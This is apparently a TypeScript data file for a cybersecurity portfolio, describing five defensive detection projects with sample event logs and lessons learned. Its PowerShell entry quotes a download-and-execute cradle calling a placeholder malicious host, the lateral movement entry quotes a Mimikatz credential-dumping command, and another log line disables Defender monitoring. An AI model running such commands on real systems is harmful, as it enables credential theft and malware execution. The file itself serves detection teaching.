export interface Project {
  id: string;
  title: string;
  category: string;
  date: string;
  description: string;
  objective: string;
  labEnvironment: string[];
  attackScenario: string;
  toolsUsed: string[];
  detectionMethod: string;
  logsFindings: string;
  impactAnalysis: string;
  lessonsLearned: string[];
  difficulty: number;
  image?: string;
}

export const projects: Project[] = [
  {
    id: "ad-lateral-movement",
    title: "Active Directory Lateral Movement Detection",
    category: "Blue Team",
    date: "January 2026",
    description:
      "Detected and analyzed lateral movement techniques within an Active Directory environment using Wazuh SIEM and Windows event logs.",
    objective:
      "Identify and document lateral movement techniques used by attackers to move across the network after initial compromise.",
    labEnvironment: [
      "Windows Server 2019 (Domain Controller)",
      "Windows 10 Clients (3x)",
      "Kali Linux (Attack Machine)",
      "Wazuh SIEM",
      "Splunk Forwarder",
    ],
    attackScenario:
      "After initial compromise via phishing, attacker uses Pass-the-Hash (PtH) and Kerberoasting techniques to escalate privileges and move laterally across the network.",
    toolsUsed: [
      "Wazuh",
      "Windows Event Viewer",
      "Splunk",
      "Mimikatz",
      "Wireshark",
      "PowerShell",
    ],
    detectionMethod:
      "Monitored Windows Security Event ID 4624 (Logon events), 4688 (Process Creation), and 4769 (Kerberos TGS requests). Detected anomalous logon patterns and unusual service account activity.",
    logsFindings: `Event ID 4769: Kerberos TGS Request
  - Service: krbtgt
  - Account: ATTACKER$
  - Ticket Encryption Type: RC4-HMAC (suspicious)
  - Result Code: 0x0 (Success)

Event ID 4624: Logon Event
  - Logon Type: 3 (Network)
  - Source IP: 192.168.1.105
  - Account: DOMAIN\\ADMIN
  - Timestamp: 2026-01-15 14:23:45

Event ID 4688: Process Creation
  - Process: mimikatz.exe
  - Parent Process: powershell.exe
  - Command Line: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
  - User: SYSTEM`,
    impactAnalysis:
      "Successful detection of lateral movement prevented further compromise. Identified 3 compromised user accounts and 2 affected systems. Immediate remediation included password reset and additional monitoring.",
    lessonsLearned: [
      "Monitor Kerberos TGS requests for unusual encryption types and service accounts",
      "Implement alerting on Process Creation events for known attack tools",
      "Use baseline analysis to identify anomalous logon patterns",
      "Correlate multiple event types for better detection accuracy",
      "Document attack chains for future reference and training",
    ],
    difficulty: 4,
  },
  {
    id: "network-discovery",
    title: "Network Discovery Monitoring",
    category: "Detection Engineering",
    date: "December 2025",
    description:
      "Implemented detection rules for network reconnaissance activities including port scanning, service enumeration, and network mapping.",
    objective:
      "Detect early-stage reconnaissance activities that indicate potential network mapping and vulnerability assessment.",
    labEnvironment: [
      "Suricata IDS",
      "Zeek Network Monitor",
      "Kali Linux",
      "Network Tap",
      "Wazuh SIEM",
    ],
    attackScenario:
      "Attacker performs network reconnaissance using Nmap, Masscan, and Shodan to identify active hosts, open ports, and running services.",
    toolsUsed: [
      "Suricata",
      "Zeek",
      "Nmap",
      "Masscan",
      "Tcpdump",
      "Wireshark",
      "ELK Stack",
    ],
    detectionMethod:
      "Created Suricata rules to detect SYN scans, UDP scans, and service probes. Monitored Zeek logs for unusual connection patterns and DNS queries.",
    logsFindings: `Suricata Alert: ET SCAN Nmap Scripting Engine User-Agent
  - Source IP: 192.168.1.100
  - Destination IP: 192.168.1.0/24
  - Alert Count: 47
  - Severity: 3

Zeek DNS Query Log:
  - Query: *.internal.local
  - Source: 192.168.1.100
  - Query Type: AXFR (Zone Transfer)
  - Response: REFUSED

Network Scan Pattern:
  - SYN packets to ports: 22, 80, 443, 3306, 5432
  - Source: 192.168.1.100
  - Destination: 192.168.1.0/24
  - Packet Count: 1024`,
    impactAnalysis:
      "Early detection of reconnaissance activity allowed for rapid response. Network segmentation was improved and additional monitoring was deployed.",
    lessonsLearned: [
      "Establish baseline network traffic patterns",
      "Monitor for unusual DNS queries and zone transfer attempts",
      "Detect port scanning patterns using statistical analysis",
      "Implement network segmentation to limit reconnaissance scope",
      "Use threat intelligence to identify known scanning tools",
    ],
    difficulty: 3,
  },
  {
    id: "brute-force-detection",
    title: "Brute Force Attack Detection",
    category: "Blue Team",
    date: "November 2025",
    description:
      "Developed detection rules for brute force attacks against SSH, RDP, and web applications using log analysis and behavioral patterns.",
    objective:
      "Identify and alert on brute force attempts in real-time to prevent unauthorized access.",
    labEnvironment: [
      "Linux Server (SSH)",
      "Windows Server (RDP)",
      "Apache Web Server",
      "Wazuh Agent",
      "ELK Stack",
    ],
    attackScenario:
      "Attacker performs dictionary attacks against SSH and RDP services using common credentials and wordlists.",
    toolsUsed: [
      "Wazuh",
      "Elasticsearch",
      "Kibana",
      "Hydra",
      "Medusa",
      "Fail2Ban",
      "Log Parser",
    ],
    detectionMethod:
      "Monitored authentication logs for multiple failed login attempts within a time window. Created correlation rules to detect patterns across multiple services.",
    logsFindings: `SSH Auth Failure Log:
  - Failed Attempts: 150 in 5 minutes
  - Source IP: 203.0.113.45
  - Usernames Attempted: root, admin, user, test, oracle
  - Timestamp: 2025-11-20 10:15:30

RDP Event Log (Event ID 4625):
  - Failed Logon Attempts: 89
  - Source IP: 203.0.113.45
  - Account: Administrator
  - Failure Reason: Invalid credentials

Web Application Log:
  - Failed Login Attempts: 200+
  - Source IP: 203.0.113.45
  - Endpoint: /admin/login
  - Time Window: 10 minutes`,
    impactAnalysis:
      "Detection triggered automatic IP blocking and alert notification. Prevented unauthorized access and identified need for MFA implementation.",
    lessonsLearned: [
      "Set appropriate thresholds for failed login detection",
      "Correlate authentication events across multiple systems",
      "Implement automatic response mechanisms (IP blocking, account lockout)",
      "Monitor for distributed brute force attacks",
      "Use threat intelligence to identify known attack sources",
    ],
    difficulty: 2,
  },
  {
    id: "powershell-detection",
    title: "Suspicious PowerShell Activity Detection",
    category: "Endpoint Detection",
    date: "October 2025",
    description:
      "Created detection rules for malicious PowerShell execution patterns including obfuscation, encoded commands, and suspicious module loading.",
    objective:
      "Detect PowerShell-based attacks and living-off-the-land techniques used by attackers.",
    labEnvironment: [
      "Windows 10 Endpoint",
      "Windows Event Forwarding",
      "Wazuh Agent",
      "Splunk",
      "PowerShell Logging",
    ],
    attackScenario:
      "Attacker uses obfuscated PowerShell commands to download and execute malware, disable security features, and establish persistence.",
    toolsUsed: [
      "Wazuh",
      "Splunk",
      "PowerShell ISE",
      "Event Viewer",
      "Process Monitor",
      "Wireshark",
    ],
    detectionMethod:
      "Enabled PowerShell Script Block Logging and Module Logging. Detected encoded commands, suspicious API calls, and registry modifications.",
    logsFindings: `PowerShell Script Block Log (Event ID 4104):
  - Script Text: (Base64 Encoded)
  - Decoded: IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
  - Execution Time: 2025-10-15 14:32:10
  - User: DOMAIN\\User

PowerShell Module Load (Event ID 4103):
  - Module: System.Net.ServicePointManager
  - Function: SetSecurityProtocol
  - Timestamp: 2025-10-15 14:32:05

Registry Modification:
  - Path: HKLM\\Software\\Policies\\Microsoft\\Windows\\Defender
  - Value: DisableRealtimeMonitoring
  - Data: 1`,
    impactAnalysis:
      "Detected malware execution before it could establish persistence. Prevented lateral movement and data exfiltration.",
    lessonsLearned: [
      "Enable comprehensive PowerShell logging on all endpoints",
      "Monitor for Base64 encoded commands and obfuscation",
      "Detect suspicious API calls and registry modifications",
      "Correlate PowerShell events with network traffic",
      "Implement application whitelisting for critical systems",
    ],
    difficulty: 4,
  },
  {
    id: "ransomware-detection",
    title: "Ransomware Behavior Detection",
    category: "Threat Detection",
    date: "September 2025",
    description:
      "Implemented behavioral detection for ransomware activities including file encryption patterns, registry modifications, and network communication.",
    objective:
      "Detect ransomware execution in early stages before significant file encryption occurs.",
    labEnvironment: [
      "Windows 10 Endpoint",
      "File Server",
      "Wazuh Agent",
      "Sysmon",
      "ELK Stack",
    ],
    attackScenario:
      "Ransomware executes on endpoint, encrypts files, modifies registry for persistence, and communicates with C2 server.",
    toolsUsed: [
      "Wazuh",
      "Sysmon",
      "Splunk",
      "Wireshark",
      "Process Monitor",
      "Yara Rules",
    ],
    detectionMethod:
      "Monitored file system activity for rapid file modifications, registry changes for persistence mechanisms, and network connections to known C2 servers.",
    logsFindings: `Sysmon Event ID 11 (File Created):
  - Target Filename: C:\\Users\\User\\Documents\\file.txt.encrypted
  - Creation Rate: 500+ files per minute
  - File Size: Varies (encrypted)
  - Timestamp: 2025-09-10 15:45:20

Registry Modification (Sysmon Event ID 13):
  - Target Object: HKLM\\Run\\Ransomware
  - Details: C:\\Windows\\Temp\\malware.exe
  - User: SYSTEM

Network Connection (Sysmon Event ID 3):
  - Source IP: 192.168.1.50
  - Destination IP: 203.0.113.99
  - Destination Port: 8080
  - Protocol: TCP`,
    impactAnalysis:
      "Early detection prevented widespread encryption. Only 50 files were encrypted before system was isolated.",
    lessonsLearned: [
      "Monitor file system activity for unusual patterns",
      "Detect registry modifications associated with persistence",
      "Implement network segmentation to limit spread",
      "Use behavioral analysis for zero-day detection",
      "Maintain offline backups for recovery",
    ],
    difficulty: 5,
  },
];
